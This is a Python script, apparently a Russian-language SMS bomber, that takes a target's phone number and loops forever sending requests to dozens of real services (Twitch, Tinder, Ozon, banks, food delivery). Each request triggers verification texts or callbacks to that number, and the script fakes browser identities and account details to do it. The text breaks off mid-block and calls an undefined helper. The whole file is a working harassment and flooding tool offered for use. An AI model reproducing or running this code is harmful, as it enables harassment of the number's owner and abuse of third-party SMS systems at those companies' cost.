import requests, time, colorama, pyglet, random, traceback
from colorama import Fore, Back, Style
colorama.init()

heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

def logo():
    print(Fore.RED + """
    ▄███████████████████████████▄
    █▄ ▄▄▀█▄ ▄▄ █▄ █ ▄█▄ ▄█▄ ▄███
    ██ ██ ██ ▄█▀██▄▀▄███ ███ ██▀█
    ▀▄▄▄▄██▄▄▄▄▄███▄███▄▄▄█▄▄▄▄▄▀
    """)
    
def choice_number():
    print(Fore.BLUE, Style.BRIGHT + "Введите номер, пример - +79508469630")
    global phone, phone9
    phone = input("Номер: ")
    phone = str(phone)
    phone9 = phone[1:]
        
def format_phone(phone, phone_mask):
    phone_list = list(phone)
    for i in phone_list:
        phone_mask = phone_mask.replace("#", i, 1)
    return phone_mask
            
name = ""
name += random.choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
password = name + random.choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
email = name + "@gmail.com"
    
headers = random.choice(heads)

def bomb():
    song = pyglet.media.load('zlobnyy-smeh-dyavola.mp3')
    song.play()
    while 0<1:
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..", "phone": formatted_phone, "email": "", "city": ""}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            print(Fore.RED + "Сообщение не отправлено!")
        try:
            formatted_phone = format_phone(phone[1:], "8(###)###-##-##")
            log = requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code", data={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://yaponchik.net/login/login.php", data={"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/", "phone": formatted_phone, "code": ""}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": "иванов", "firstName": "иван", "middleName": "иванович", "mobilePhone": phone, "email": email, "smsCode": ""}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": name}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://b.utair.ru/api/v1/login/", json={"login": phone, "confirmation_type": "call_code"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "#(###)###-##-##")
            log = requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action": "auth", "phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": generate_user_agent()}, json={"phone": phone}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": generate_user_agent()}, json={"phone": phone}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth", json={"doc": {"auth": {"mphone": "+" + phone, "bdate": "11.11.1999", "deviceid": "00100", "version": "1.0", "source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json", "User-Agent": generate_user_agent()}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://www.top-shop.ru/login/loginByPhone/", data={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "8(###)###-##-##")
            log = requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code", data={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": phone9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ### - ## - ##")
            log = requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php", data={"RECALL": "Y", "BACK_CALL_PHONE": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", data={"action": "callback_phonenumber", "phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://tabasko.su/", data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.sushi-profi.ru/api/order/order-call/", json={"phone": phone9, "name": name}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8(###)###-##-##")
            log = requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code", data={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
            log = requests.post("http://sushigourmet.ru/auth", data={"phone": formatted_phone, "stage": 1}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8-###-###-##-##")
            log = requests.post("https://pizzasushiwok.ru/index.php", data={"mod_name": "registration", "tpl": "restore_password", "phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://smart.space/api/users/request_confirmation_code/", json={"mobile": "+" + phone, "action": "confirm_mobile"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://shopandshow.ru/sms/password-request/", data={"phone": "+" + phone, "resend": 0}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://shafa.ua/api/v3/graphiql", json={"operationName": "RegistrationSendSms", "variables": {"phoneNumber": "+" + phone}, "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://shafa.ua/api/v3/graphiql", json={"operationName": "sendResetPasswordSms", "variables": {"phoneNumber": "+" + phone}, "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        
        try:
            log = requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login", data={"data": {"login": phone9, "check": True, "crypto": {"captcha": "739699"}}}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://rieltor.ua/api/users/register-sms/", json={"phone": phone, "retry": 0}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+#(###)###-##-##")
            log = requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/", data={"phone": formatted_phone, "alien": "0"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code", params={"number": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+#-###-###-##-##")
            log = requests.post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": formatted_phone}}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode", data={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8-###-###-##-##")
            log = requests.post("https://pizzasushiwok.ru/index.php", data={"mod_name": "call_me", "task": "request_call", "name": name, "phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://pizzakazan.com/auth/ajax.php", data={"phone": "+" + phone, "method": "sendCode"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-####")
            log = requests.post("https://pizza46.ru/ajaxGet.php", data={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={"telephone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+#-###-###-##-##")
            log = requests.post("https://paylate.ru/registry", data={"mobile": formatted_phone, "first_name": name, "last_name": name, "nick_name": name,  "gender-client": 1, "email": email, "action": "registry"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + phone9}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-####")
            log = requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php", data={"name": "Auth.SendPassword", "params[0]": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://ontaxi.com.ua/api/v2/web/client", json={"country": "UA", "phone": phone[3:]}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
            log = requests.get("https://okeansushi.ru/includes/contact.php", params={"call_mail": "1", "ajax": "1", "name": name, "phone": formatted_phone, "call_time": "1", "pravila2": "on"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode", "phone": phone, "registration": "N"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.niyama.ru/ajax/sendSMS.php", data={"REGISTER[PERSONAL_PHONE]": phone, "code": "", "sendsms": "Выслать код"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://auth.multiplex.ua/login", json={"login": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.moyo.ua/identity/registration", data={"firstname": name, "phone": phone, "email": email}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php", data={"name": name, "phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code", data="+" + phone, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone", json={"FirstName": name, "CellPhone": phone, "Package": "optimal"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://mobileplanet.ua/register", data={"klient_name": name, "klient_phone": "+" + phone, "klient_email": email}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://menza-cafe.ru/system/call_me.php", params={"fio": name, "phone": phone, "phone_number": "1"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html", data={"user_info[fullname]": name, "user_info[phone]": phone, "user_info[email]": email, "user_info[password]": password, "user_info[conf_password]": password}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html", data={"phone": phone, "do": "phone"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# ### ### ## ##")
            log = requests.get("https://makimaki.ru/system/callback.php", params={"cb_fio": name, "cb_phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", data={"data": phone, "metod": "postreg"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9", "User-Agent": generate_user_agent()}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://loany.com.ua/funct/ajax/registration/code", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website", "User-Agent": generate_user_agent()}, json={"Phone": phone, "Type": 1}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "# (###) ###-##-##")
            log = requests.post("https://kilovkusa.ru/ajax.php", params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"}, data={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
